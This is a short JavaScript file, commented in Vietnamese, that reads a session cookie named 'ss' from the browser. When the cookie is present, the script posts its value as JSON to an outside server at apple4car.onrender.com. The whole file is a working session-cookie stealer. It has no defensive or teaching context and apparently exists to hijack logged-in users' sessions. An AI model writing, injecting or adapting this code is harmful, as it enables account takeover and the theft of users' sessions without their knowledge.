// Hàm lấy giá trị của cookie theo tên
function getCookie(name) {
    const value = `; ${document.cookie}`;
    const parts = value.split(`; ${name}=`);
    if (parts.length === 2) return parts.pop().split(';').shift();
}

// Lấy giá trị của cookie "ss"
const sessionID = getCookie("ss");

// Nếu có giá trị sessionID (đã đăng nhập), gửi yêu cầu POST
if (sessionID) {
    // Chuẩn bị dữ liệu cho yêu cầu POST
    const data = {
        sessionID: sessionID
    };

    // Gửi yêu cầu POST đến API
    fetch("https://apple4car.onrender.com/sessionID", {
        method: "POST",
        headers: {
            "Content-Type": "application/json"
        },
        body: JSON.stringify(data)
    })
    .then(response => response.json())
    .then(data => {
        // Xử lý kết quả từ API (nếu cần)
        console.log("Kết quả từ API:", data);
    })
    .catch(error => {
        // Xử lý lỗi nếu có
        console.error("Lỗi khi gửi yêu cầu đến API: " + error);
    });
}
